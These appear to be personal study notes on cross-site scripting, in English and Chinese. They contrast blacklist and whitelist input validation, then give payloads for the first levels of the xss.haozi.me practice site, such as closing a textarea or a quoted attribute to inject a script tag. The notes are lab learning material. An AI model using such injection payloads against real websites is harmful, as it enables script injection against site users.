+Even if a perfect blacklist were developed, it would fail if a new feature allowing malicious use were added to the browser. For example, an HTML validation blacklist developed before the introduction of the HTML5 `onmousewheel` attribute would fail to stop an attacker from using that attribute to perform an XSS attack. This drawback is especially significant in web development, which is made up of many different technologies that are constantly being updated.
+
+**Because of these drawbacks, blacklisting as a classification strategy is strongly discouraged. Whitelisting is usually a much safer approach**
+
+
+
+##### Whitelisting
+
+instead of defining a forbidden pattern, a whitelist approach defines an allowed pattern and marks input as invalid if it *does not* match this pattern.
+
+In contrast with the blacklisting example before, an example of whitelisting would be to allow users to submit custom URLs containing only the protocols `http:` and `https:`, nothing else. This approach would automatically mark a URL as invalid if it had the protocol `javascript:`, even if it appeared as "`Javascript:`" or "`javascript:`".
+
+Compared to blacklisting, there are **two major benefits of whitelisting:**
+
+- **Simplicity**
+
+  Accurately describing a set of safe strings is generally much easier than identifying the set of all malicious strings. This is especially true in common situations where user input only needs to include a very limited subset of the functionality available in a browser. 
+
+  **Longevity**
+
+  Unlike a blacklist, a whitelist will generally not become obsolete when a new feature is added to the browser. For example, an HTML validation whitelist allowing only the `title` attribute on HTML elements would remain safe even if it was developed before the introduction of HTML5 `onmousewheel` attribute.
+
+
+
+
+
+
+
+## Practises
+
+https://xss.haozi.me/
+
+
+
+### 00
+
+![image-20240505194515271](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505194515271.png)
+
+payload : `<script>alert(1)</script>`
+
+
+
+### 01
+
+
+
+#### `<textarea>`
+
+https://developer.mozilla.org/en-US/docs/Web/HTML/Element/textarea
+
+a multi-line plain-text editing control, useful when you want to allow users to enter a sizeable amount of free-form text, for example a comment on a review or feedback form.
+
+**example :** 
+
+```html
+<label for="story">Tell us your story:</label>
+<textarea id="story" name="story" rows="5" cols="33">
+    It was a dark and stormy night...
+</textarea>
+```
+
+<label for="story">Tell us your story:</label>
+
+<textarea id="story" name="story" rows="5" cols="33">
+    It was a dark and stormy night...
+</textarea>
+
+features :
+
+- An `id` attribute to allow the `<textarea>` to be associated with a `<label>` element for accessibility purposes
+- A `name` attribute to set the name of the associated data point submitted to the server when the form is submitted.
+
+- `rows` and `cols` attributes to allow you to specify an exact size for the `<textarea>` to take. Setting these is a good idea for consistency, as browser defaults can differ.
+
+- Default content entered between the opening and closing tags. `<textarea>` does not support the `value` attribute.
+
+
+
+#### Solve
+
+![image-20240505195702184](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505195702184.png)
+
+payload = `</textarea><script>alert(1)</script>`
+
+首先需要闭合 `<textarea>` 标签
+
+
+
+### 02
+
+![image-20240505200032916](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505200032916.png)
+
+payload = `"><script>alert(1)</script>`
+
+首先需要闭合value 遗留的 "  , 然后再闭合input 标签的 > ,
+
+
+
+### 03
+
+正则 `/[()]/g` 意义 ：
+
+- `/`：正则表达式的开始和结束分隔符。在 JavaScript 和许多其他语言中，正则表达式通常使用 `/` 包裹
+- `[()]`：方括号内的字符集，表示匹配其中的任意一个字符。即匹配 `(` 或 `)`
+- `g`：全局标志，表示匹配应该应用于整个字符串，而不是仅仅匹配第一个出现的实例。
+
+![image-20240505220339316](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505220339316.png)
